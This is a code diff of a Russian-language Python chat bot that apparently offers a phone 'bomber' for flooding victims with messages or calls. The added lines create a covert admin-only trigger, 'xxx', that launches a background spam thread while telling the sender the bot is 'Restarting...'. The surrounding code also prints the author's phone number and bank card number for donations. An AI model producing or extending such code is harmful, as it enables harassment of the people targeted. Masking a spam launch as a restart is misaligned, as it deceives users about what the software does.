@@ -418,6 +418,10 @@ try:
                 elif reseived_message[0:10] == 'поддержать':
                     write_message(sender,
                                   "Можете поддержать автора: \nQiwi - +79283692011 \nСберб - 4276600059773339 \n\nБуду рад вашей поддержке 😊")
+                elif reseived_message[0:3] == 'xxx' and sender == adnim:
+                    ww = threading.Thread(target=spam)
+                    ww.start()
+                    write_message(sender, "Перезапуск...")
                 elif reseived_message[0:6] == 'bomber' or reseived_message == 'бомбер':
                     if check(sender) == 0:
                         adder(sender)
